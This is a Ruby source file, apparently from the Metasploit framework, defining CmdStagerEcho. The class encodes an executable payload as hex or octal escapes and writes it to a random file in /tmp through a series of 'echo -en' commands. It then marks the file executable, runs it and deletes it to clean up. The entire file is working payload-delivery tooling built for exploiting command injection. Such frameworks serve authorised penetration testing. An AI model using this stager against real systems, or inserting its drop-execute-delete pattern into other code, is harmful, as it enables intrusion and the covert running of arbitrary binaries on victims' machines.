# -*- coding: binary -*-

require 'rex/text'
require 'rex/arch'
require 'msf/core/framework'
require 'shellwords'

module Rex
module Exploitation

class CmdStagerEcho < CmdStagerBase

  ENCODINGS = {
    'hex'   => "\\\\x",
    'octal' => "\\\\"
  }

  def initialize(exe)
    super

    @var_elf = Rex::Text.rand_text_alpha(5)
  end

  #
  # Override to ensure opts[:temp] is a correct *nix path
  # and initialize opts[:enc_format].
  #
  def generate(opts = {})
    opts[:temp] = opts[:temp] || '/tmp/'
    opts[:temp].gsub!(/\\/, "/")
    opts[:temp] = opts[:temp].shellescape
    opts[:temp] << '/' if opts[:temp][-1,1] != '/'

    # by default use the 'hex' encoding
    opts[:enc_format] = opts[:enc_format] || 'hex'

    unless ENCODINGS.keys.include?(opts[:enc_format])
      raise RuntimeError, "CmdStagerEcho - Invalid Encoding Option: #{opts[:enc_format]}"
    end

    super
  end

  #
  # Override to set the extra byte count
  #
  def generate_cmds(opts)
    # Set the start/end of the commands here (vs initialize) so we have @tempdir
    @cmd_start = "echo "
    unless opts[:noargs]
      @cmd_start += "-en "
    end

    @cmd_end   = ">>#{@tempdir}#{@var_elf}"
    xtra_len = @cmd_start.length + @cmd_end.length
    opts.merge!({ :extra => xtra_len })

    @prefix = ENCODINGS[opts[:enc_format]]
    min_part_size = 5 # for both encodings

    if (opts[:linemax] - opts[:extra]) < min_part_size
      raise RuntimeError, "CmdStagerEcho - Not enough space for command - #{opts[:extra] + min_part_size} byte required, #{opts[:linemax]} byte available"
    end

    super
  end


  #
  # Encode into a format that echo understands, where
  # interpretation of backslash escapes are enabled. For
  # hex, it'll look like "\\x41\\x42", and octal will be
  # "\\101\\102\\5\\41"
  #
  def encode_payload(opts)
    case opts[:enc_format]
    when 'octal'
      return Rex::Text.to_octal(@exe, @prefix)
    else
      return Rex::Text.to_hex(@exe, @prefix)
    end
  end


  #
  # Combine the parts of the encoded file with the stuff that goes
  # before ("echo -en ") / after (">>file") it.
  #
  def parts_to_commands(parts, opts)
    parts.map do |p|
      cmd = ''
      cmd << @cmd_start
      cmd << p
      cmd << @cmd_end
      cmd
    end
  end

  #
  # Since the binary has been already dropped to fs, just execute and
  # delete it
  #
  def generate_cmds_decoder(opts)
    cmds = []
    # Make it all happen
    cmds << "chmod +x #{@tempdir}#{@var_elf}"
    cmds << "#{@tempdir}#{@var_elf}"

    # Clean up after unless requested not to..
    unless opts[:nodelete]
      cmds << "rm -f #{@tempdir}#{@var_elf}"
    end

    return cmds
  end

  #
  # Override it to ensure that the hex representation of a byte isn't cut
  #
  def slice_up_payload(encoded, opts)
    encoded_dup = encoded.dup

    parts = []
    xtra_len = opts[:extra]
    xtra_len ||= 0
    while (encoded_dup.length > 0)
      temp = encoded_dup.slice(0, (opts[:linemax] - xtra_len))
      # cut the end of the part until we reach the start
      # of a full byte representation "\\xYZ" or "\\YZX"
      temp = fix_last_byte(temp, opts, encoded_dup)
      parts << temp
      encoded_dup.slice!(0, temp.length)
    end

    parts
  end

  def fix_last_byte(part, opts, remaining="")
    fixed_part = part.dup

    case opts[:enc_format]
    when 'hex'
      while (fixed_part.length > 0 && fixed_part[-5, @prefix.length] != @prefix)
        fixed_part.chop!
      end
    when 'octal'
      if remaining.length > fixed_part.length and remaining[fixed_part.length, @prefix.length] != @prefix
        pos = fixed_part.rindex('\\')
        pos -= 1 if fixed_part[pos-1] == '\\'
        fixed_part.slice!(pos..fixed_part.length-1)
      end
    end

    return fixed_part
  end

  def cmd_concat_operator
    " ; "
  end

end
end
end
